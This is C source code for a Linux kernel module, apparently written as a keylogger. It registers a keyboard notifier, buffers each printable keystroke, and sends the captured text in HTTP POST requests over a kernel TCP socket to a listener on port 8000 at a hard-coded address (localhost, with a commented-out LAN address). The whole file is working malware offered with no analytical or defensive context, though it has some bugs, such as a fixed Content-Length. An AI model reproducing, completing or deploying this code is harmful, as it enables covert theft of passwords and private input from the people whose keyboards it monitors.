#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/notifier.h>
#include <linux/kmod.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/fcntl.h>
#include <linux/net.h>
#include <net/sock.h>
#include <linux/tcp.h>
#include <linux/in.h>
#include <asm/uaccess.h>
#include <linux/socket.h>
#include <linux/slab.h>

#define PORT 8000
#define BUFFER_LEN 1024

static char keys_buffer[BUFFER_LEN]; 
static char *keys_bf_ptr = keys_buffer; 
int buf_pos = 0;
struct socket *conn_socket = NULL;

static int takeKey(struct notifier_block *, unsigned long, void *); 
int tcpConnect(void);
void tcpSend(struct socket *sock, const char *buf, const size_t length);
static struct notifier_block nb = {
	.notifier_call = takeKey
};

static int takeKey(struct notifier_block *nb, unsigned long action, void *data) {
	struct keyboard_notifier_param *param = data;
	int len = 100;
        char sockBuff[len];
	if (action == KBD_KEYSYM && param->down) {
		char c = param->value;
		if (c == 0x01) {
			*(keys_bf_ptr++) = 0x0a;
			buf_pos++;
		} else if (c >= 0x20 && c < 0x7f) {
			*(keys_bf_ptr++) = c;
			buf_pos++;
		}
		if(buf_pos > 10){
			memset(&sockBuff, 0, len);
			strcat(sockBuff, "POST / HTTP/1.1\r\nContent-Type: text/plain\r\nContent-Length: 11\r\n\r\n");
			*(keys_bf_ptr++) = 0x0;
			strcat(sockBuff, keys_buffer);
			tcpSend(conn_socket, sockBuff, strlen(sockBuff));             
			buf_pos = 0;
			memset(keys_buffer, 0, BUFFER_LEN);
			keys_bf_ptr = keys_buffer;
		}
	}	 
	return NOTIFY_OK;
}

void tcpSend(struct socket *sock, const char *buf, const size_t length)
{
        struct msghdr msg;
        struct kvec vec;
        int len, written = 0, left = length;
        msg.msg_name    = 0;
        msg.msg_namelen = 0;
        msg.msg_control = NULL;
        msg.msg_controllen = 0;
        msg.msg_flags   = NULL;
	while(left){
		vec.iov_len = left;
		vec.iov_base = (char *)buf + written;
		len = kernel_sendmsg(sock, &msg, &vec, left, left);
		if(len > 0)
		{
		        written += len;
		        left -= len;
		}
        }
        return;
}


int tcpConnect(void)
{
	u32 addr = 0;
        int i;
        struct sockaddr_in saddr;
        unsigned char ip[5] = {127,0,0,1,'\0'};// {192,168,158,1,'\0'};
        int ret = -1;
        ret = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_socket);
        if(ret < 0){
                goto err;
        }
	
	 for(i=0; i<4; i++)
        {
                addr += ip[i];
                if(i==3)
                        break;
                addr = addr << 8;
        }
	
        memset(&saddr, 0, sizeof(saddr));
        saddr.sin_family = AF_INET;
        saddr.sin_port = htons(PORT);
        saddr.sin_addr.s_addr = htonl(addr);

        ret = conn_socket->ops->connect(conn_socket, (struct sockaddr *)&saddr, sizeof(saddr), O_RDWR);
        if(ret && (ret != -EINPROGRESS)){
                goto err;
        }
err:
        return -1;
}


static int __init keylog_init(void) {	
	register_keyboard_notifier(&nb);
	memset(keys_buffer, 0, BUFFER_LEN);
	tcpConnect();
	return 0;
}

static void __exit keylog_exit(void) {
	unregister_keyboard_notifier(&nb);
	printk(KERN_INFO "Keylogger unloaded\n");
	if(conn_socket != NULL)
	{
		sock_release(conn_socket);
		printk(KERN_INFO "socket released\n");
	}
}

module_init(keylog_init);
module_exit(keylog_exit);
MODULE_LICENSE("GPL");
